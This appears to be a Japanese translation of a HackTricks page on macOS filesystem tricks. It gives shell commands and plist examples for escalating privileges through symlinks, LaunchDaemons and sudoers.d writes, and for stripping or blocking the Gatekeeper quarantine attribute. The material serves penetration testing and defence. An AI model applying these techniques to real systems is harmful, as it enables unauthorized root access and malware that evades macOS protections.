# macOS FS Tricks

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
- **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## POSIX権限の組み合わせ

**ディレクトリ**の権限：

- **read** - ディレクトリエントリを**列挙**できる
- **write** - ディレクトリ内の**ファイルを削除/書き込み**し、**空のフォルダを削除**できる。&#x20;
- ただし、**書き込み権限**がない限り、**空でないフォルダを削除/変更**することはできません。
- 所有権がない限り、**フォルダの名前を変更**することはできません。
- **execute** - ディレクトリを**トラバース**することが許可されています - この権限がない場合、そのディレクトリ内またはサブディレクトリ内のファイルにアクセスできません。

### 危険な組み合わせ

**rootが所有するファイル/フォルダを上書き**する方法：

- パス内の1つの親**ディレクトリ所有者**がユーザーである
- パス内の1つの親**ディレクトリ所有者**が**書き込みアクセス**を持つ**ユーザーグループ**である
- ユーザーグループが**ファイル**に**書き込み**アクセス権を持っている

前述のいずれかの組み合わせで、攻撃者は特権付きの任意の書き込みを取得するために期待されるパスに**sym/hard linkを注入**することができます。

### フォルダルート R+X 特殊ケース

**rootだけがR+Xアクセス権を持つディレクトリ**にファイルがある場合、それらは**他の誰にもアクセスできません**。したがって、**ユーザーが読み取り可能なファイル**を**移動**する脆弱性がある場合、その**制限**のために読み取ることができないファイルを、このフォルダから**別のフォルダ**に移動することが悪用される可能性があります。

例：[https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## シンボリックリンク / ハードリンク

特権付きプロセスが**制御可能なファイル**に**書き込んでいる**場合、または**以前に低権限ユーザーによって作成された**ファイルに書き込んでいる場合、ユーザーは単にシンボリックリンクまたはハードリンクを介して別のファイルを指し示し、特権付きプロセスがそのファイルに書き込みます。

攻撃者が特権を昇格させるために**任意の書き込みを悪用**できる場所を確認してください。

## .fileloc

**`.fileloc`** 拡張子のファイルは、他のアプリケーションやバイナリを指すことができるため、それらを開くと、そのアプリケーション/バイナリが実行されます。\
例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 任意のFD

**プロセスに高い権限でファイルまたはフォルダを開かせる**ことができれば、**`crontab`**を悪用して`EDITOR=exploit.py`で`/etc/sudoers.d`内のファイルを開くようにし、`exploit.py`が`/etc/sudoers`内のファイルに対するFDを取得して悪用することができます。

例: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## クォータンティンxattrsトリックを回避する

### それを削除します
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable フラグ

ファイル/フォルダにこの immutable 属性がある場合、その上に xattr を配置することはできません。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs マウント

**devfs** マウントは **xattr をサポートしていません**。詳細は[**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)を参照してください。
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

このACLは、ファイルに`xattrs`を追加することを防ぎます。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**ファイル形式は、ACEを含むファイルをコピーします。

[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)では、xattrとして保存されているACLテキスト表現である**`com.apple.acl.text`**が、展開されたファイルのACLとして設定されることがわかります。したがって、ACLを持つAppleDoubleファイル形式でアプリケーションをzipファイルに圧縮した場合、他のxattrの書き込みを防ぐACLが設定されていない場合、quarantine xattrはアプリケーションに設定されませんでした：

詳細については、[**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を参照してください。

これを再現するには、まず正しいACL文字列を取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（これが機能する場合でも、サンドボックスはquarantine xattrを書き込みます）

実際には必要ありませんが、念のため残しておきます：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## コード署名のバイパス

バンドルには、**`_CodeSignature/CodeResources`** というファイルが含まれており、**バンドル**内のすべての**ファイル**の**ハッシュ**が含まれています。 CodeResourcesのハッシュは**実行可能ファイルにも埋め込まれている**ため、それをいじることはできません。

ただし、いくつかのファイルは署名がチェックされないため、これらはplistにomitというキーが含まれています。
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLIからリソースの署名を計算することが可能です：

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmg ファイルのマウント

ユーザーは、既存のフォルダの上にカスタム dmg をマウントすることができます。以下は、カスタムコンテンツを含むカスタム dmg パッケージを作成する方法です:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## 任意の書き込み

### 定期的なshスクリプト

スクリプトが**シェルスクリプト**として解釈される可能性がある場合、毎日トリガーされる**`/etc/periodic/daily/999.local`**シェルスクリプトを上書きできます。

次のコマンドでこのスクリプトの実行を**偽装**できます: **`sudo periodic daily`**

### デーモン

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**のような**LaunchDaemon**を任意に書き込み、任意のスクリプトを実行するplistを作成します:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### スクリプト `/Applications/Scripts/privesc.sh` を生成し、**root** として実行したい**コマンド**を記述してください。

### Sudoers ファイル

**任意の書き込み権限**がある場合、**`/etc/sudoers.d/`** フォルダ内にファイルを作成し、自身に**sudo** 権限を付与することができます。

### PATH ファイル

**`/etc/paths`** ファイルは PATH 環境変数を設定する主要な場所の1つです。これを上書きするには root 権限が必要ですが、**特権プロセス**からのスクリプトが**完全なパスなしでコマンドを実行**している場合、このファイルを変更することで**乗っ取る**ことができるかもしれません。

&#x20;`/etc/paths.d`** にファイルを書き込んで、`PATH` 環境変数に新しいフォルダを読み込むこともできます。

## 参考文献

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> で **ゼロからヒーローまでのAWSハッキング**を学びましょう！</summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝**したい場合や **HackTricks をPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つけてください
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローしてください。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出して、あなたのハッキングテクニックを共有してください。

</details>
